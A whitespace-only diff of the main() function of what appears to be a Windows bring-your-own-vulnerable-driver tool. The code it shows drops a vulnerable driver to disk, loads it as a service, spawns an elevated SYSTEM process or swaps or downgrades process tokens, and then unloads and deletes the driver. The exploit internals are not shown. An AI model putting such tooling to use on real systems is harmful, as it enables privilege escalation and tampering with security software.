@@ -89,7 +89,7 @@ int main(int argc, char** argv) {
 	}
 	PrintOffsets();
 	okay("GetOffsets - Retrieved offsets");
-	
+
 	// Write the vulnerable driver to the file system
 	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
 	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
@@ -101,7 +101,7 @@ int main(int argc, char** argv) {
 	}
 	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
 	printf("\n");
-	
+
 	// Load the vulnerable driver as a service
 	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
 	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
@@ -121,7 +121,7 @@ int main(int argc, char** argv) {
 	}
 	else if (bNewSystemProcess) {
 		info("StartNewSystemProcess - Starting new process and elevating token");
-		if (!StartNewSystemProcess()) {                   
+		if (!StartNewSystemProcess()) {
 			error("StartNewSystemProcess - Failed to start process or elevate token");
 		}
 		okay("StartNewSystemProcess - Started new process and elevated token");
@@ -137,11 +137,11 @@ int main(int argc, char** argv) {
 		okay("ReplaceToken - Downgraded token of PID %d with token of PID %d", dwTargetPID, dwSourcePID);
 		printf("\n");
 	}
-	
+
 _cleanUp:
 
 	// ** CLEANUP SECTION ** //
-	
+
 	// Unloading vulnerable driver
 	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
 	if (!UnloadDriver(g_VULNDRIVERNAME)) {
@@ -150,7 +150,7 @@ _cleanUp:
 	}
 	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
 	printf("\n");
-	
+
 	// Remove vulnerable driver from filesystem
 	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
 	if (!RemoveFileW(szVulnDriverPath)) {
@@ -159,7 +159,7 @@ _cleanUp:
 	}
 	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
 	printf("\n");
-	
+
 	// Free allocated memory
 	if (szVulnDriverPath != NULL) {
 		free(szVulnDriverPath);
@@ -171,5 +171,5 @@ _cleanUp:
 	else {
 		return EXIT_FAILURE;
 	}
-	
+
 }
